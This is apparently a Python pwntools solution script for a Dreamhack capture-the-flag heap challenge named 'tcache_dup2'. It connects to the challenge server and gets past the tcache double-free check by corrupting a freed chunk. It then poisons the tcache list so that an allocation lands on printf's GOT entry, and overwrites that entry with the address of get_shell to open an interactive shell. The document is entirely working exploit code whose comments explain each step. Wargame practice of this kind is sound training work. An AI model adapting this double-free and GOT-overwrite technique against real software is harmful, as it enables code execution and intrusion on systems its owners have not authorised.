from pwn import *

p = remote('host3.dreamhack.games', 15086)
e = ELF('./tcache_dup2')
libc = ELF('./libc-2.30.so')

got_printf = e.got['printf']
get_shell = e.symbols['get_shell']


def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ',str(size).encode())
    p.sendafter(b'Data: ', data)
    
def modify(idx, size, data):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ',str(size).encode())
    p.sendafter(b'Data: ', data)
    
def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())


# tcache[0x20]: chunk A
create(0x10, b'a')
delete(0)

# Free chunk A again, bypassing the DFB mitigation
# tcache[0x20]: chunk A -> chunk A -> ...
modify(0, 0x10, b'b'*0x9)
delete(0)

create(0x10, b'dummy')
# tcache[0x20]: chunk A -> got@printf
modify(0, 0x8, p64(got_printf))

# tcache[0x20]: got@printf
create(0x10, b'dummy')

# got@printf = the address of get_shell
create(0x10, p64(get_shell))

p.interactive()



